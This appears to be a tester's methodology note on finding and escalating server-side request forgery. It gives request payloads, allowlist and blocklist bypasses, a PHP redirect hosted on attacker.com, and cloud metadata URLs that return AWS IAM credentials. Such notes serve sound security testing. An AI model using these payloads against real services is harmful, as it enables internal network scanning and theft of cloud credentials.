## Step 1: Spot Features Prone to SSRFs
webhooks, file uploads, document and image processors, link expansions or thumbnails, and proxy services
webhooks are a way of notifying the system to kick-start another process
#### Take note of every potential endpoints:

Add a new webhook:
```md
POST /webhook
Host: public.example.com

(POST request body)
url=https://www.attacker.com
```

File upload via URL:
```md
POST /upload_profile_from_url
Host: public.example.com

(POST request body)
user_id=1234&url=https://www.attacker.com/profile.jpeg
```

Proxy service: 
`https://public.example.com/proxy?url=https://google.com`
## Step 2: Provide Potentially Vulnerable Endpoints with Internal URLs
- try (localhost, 127.0.0.1, 0.0.0.0, 192.168.0.1, and 10.0.0.1), https://en.wikipedia.org/wiki/Reserved_IP_addresses.
Examples: 
- `https://public.example.com/proxy?url=https://192.168.0.1`

We can trick the server into visiting its own port 22 and returning information about itself. Then look for text like this in the response (in case it's a regular SSRF not Blind): `Error: cannot upload image: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4 ` :

```md
POST /upload_profile_from_url
Host: public.example.com

(POST request body)
user_id=1234&url=127.0.0.1:22
```
# Testing
- Spot the features prone to SSRFs and take notes for future reference
- use https://app.interactsh.com/#/ for blind SSRF
- **Allow list?**
	-  Try find open redirect in the allowed subdomains `user_id=1234&url=https://pics.example.com/123?redirect=127.0.0.1`
	- **Bypassing wildcard allowlisted subdomain regex**
		- (`pics.example.com` is seen as the username portion of the URL): `user_id=1234&url=https://pics.example.com@127.0.0.1`
		- pics.example.com is seen as the directory portion of the URL:
		  `user_id=1234&url=https://127.0.0.1/pics.example.com`
- **Blocklist?**
	- on your server at` https://attacker.com/ssrf` host file content:`<?php header("location: http://127.0.0.1"); ?>` and then access the file from the parameter:
	 ` https://public.example.com/proxy?url=https://attacker.com/ssrf`
- **IPv6**
	- try payloads as much as u can (fc00:: / ::1) and other IP representations
- Change your domain DNS `A/AAAA` records so that it points to 127.0.0.1 and then : `https://public.example.com/proxy?url=https://attacker.com`
- try different encoding like (Hex, Octal, dword, URL) and combination of it
- Perform Network Scanning `user_id=1234&url=https://10.0.0.2`
- Querying EC2 Metadata `https://public.example.com/proxy?url=http://169.254.169.254/latest/meta-data/`
# Escalating the Attack and Use Cases

- Perform Network Scanning
### Querying Metadata for Cloud Providers

#### EC2 (AWS)
These endpoints reveal information such as API keys, Amazon S3 tokens (tokens used to access Amazon S3 buckets), and passwords. Try requesting these especially useful API endpoints:
- `http://169.254.169.254/latest/meta-data/` returns the list of available metadata that you can query.
- `http://169.254.169.254/latest/meta-data/local-hostname/` returns the internal hostname used by the host.
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME` returns the security credentials of that role.
- `http://169.254.169.254/latest/dynamic/instance-identity/document/` reveals the private IP address of the current instance.
- `http://169.254.169.254/latest/user-data/` returns user data on the current instance.

#### DigitalOcean 
you can retrieve a list of metadata endpoints by visiting the http://169.254.169.254/metadata/v1/ endpoint.

retrieve key pieces of information such as the instance’s hostname and user data. For Kubernetes, try accessing 
https://kubernetes.default and https://kubernetes.default.svc/metrics for information about the system.
